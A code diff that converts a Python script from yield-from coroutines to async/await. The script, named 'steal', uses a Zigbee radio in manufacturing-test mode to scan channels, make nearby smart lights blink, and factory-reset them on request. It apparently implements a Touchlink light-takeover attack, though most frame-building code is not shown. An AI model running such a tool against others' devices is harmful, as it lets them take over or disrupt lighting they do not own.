@@ -18,18 +18,17 @@ class Prompt:
     def got_input(self):
         asyncio.ensure_future(self.q.put(sys.stdin.readline()), loop=self.loop)
 
-    @asyncio.coroutine
-    def __call__(self, msg, end='\n', flush=False):
+    async def __call__(self, msg, end='\n', flush=False):
         print(msg, end=end, flush=flush)
-        return (yield from self.q.get()).rstrip('\n')
+        return (await self.q.get()).rstrip('\n')
 
 
-def steal(device):
-    s = yield from util.setup(device, baudrate=57600)
-    eui64 = yield from getattr(s, 'getEui64')()
+async def steal(device):
+    s = await util.setup(device, baudrate=57600)
+    eui64 = await getattr(s, 'getEui64')()
     eui64 = bellows.types.named.EmberEUI64(*eui64)
 
-    v = yield from s.mfglibStart(True)
+    v = await s.mfglibStart(True)
     util.check(v[0], "Unable to start mfglib")
 
     DLT_IEEE802_15_4 = 195
@@ -63,7 +62,7 @@ def steal(device):
 
     for channel in range(11, 27):
         print("Scanning on channel",channel)
-        v = yield from s.mfglibSetChannel(channel)
+        v = await s.mfglibSetChannel(channel)
         util.check(v[0], "Unable to set channel")
 
         transaction_id = randint(0, 0xFFFFFFFF)
@@ -77,10 +76,10 @@ def steal(device):
             transactionId = transaction_id,
         ).serialize()
         dumpPcap(frame)
-        r = yield from s.mfglibSendPacket(frame)
+        r = await s.mfglibSendPacket(frame)
         util.check(v[0], "Unable to send packet")
 
-        yield from asyncio.sleep(1)
+        await asyncio.sleep(1)
 
         while len(targets)>0:
             target = targets.pop()
@@ -93,8 +92,8 @@ def steal(device):
                 frameControl = 0xCC21,
             ).serialize()
             dumpPcap(frame)
-            yield from s.mfglibSendPacket(frame)
-            answer = yield from prompt("Do you want to factory reset the light that just blinked? [y|n] ")
+            await s.mfglibSendPacket(frame)
+            answer = await prompt("Do you want to factory reset the light that just blinked? [y|n] ")
 
             if answer.strip().lower() == "y":
                 print("Factory resetting "+str(target))
@@ -107,12 +106,12 @@ def steal(device):
                     frameControl = 0xCC21,
                 ).serialize()
                 dumpPcap(frame)
-                yield from s.mfglibSendPacket(frame)
-                yield from asyncio.sleep(1)
+                await s.mfglibSendPacket(frame)
+                await asyncio.sleep(1)
 
     s.remove_callback(cbid)
 
-    v = yield from s.mfglibEnd()
+    v = await s.mfglibEnd()
 
     s.close()
 
@@ -122,4 +121,3 @@ if len(sys.argv) != 2:
 
 loop = asyncio.get_event_loop()
 loop.run_until_complete(steal(sys.argv[1]))
-
